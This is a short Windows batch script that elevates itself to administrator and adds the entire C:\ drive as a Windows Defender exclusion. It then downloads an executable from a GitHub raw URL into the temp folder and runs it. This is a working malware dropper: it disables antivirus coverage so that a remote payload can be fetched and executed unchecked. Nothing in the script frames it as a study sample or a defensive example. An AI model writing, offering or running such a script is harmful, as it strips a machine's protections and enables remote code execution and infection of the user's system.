@echo off
:: Check for admin rights (simple method)
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Not admin. Requesting elevation...
    powershell -Command "Start-Process cmd -ArgumentList '/c \"%~f0\"' -Verb RunAs"
    exit /b
)

:: Now running as admin
echo Running as admin. Disabling Defender for C:\...
powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

echo Downloading dummy.exe...
set "exeFile=%TEMP%\dummy.exe"
powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/clickmaggot-bit/my-repository/raw/refs/heads/main/dummy.exe', '%exeFile%')"

echo Executing dummy.exe...
start "" "%exeFile%"
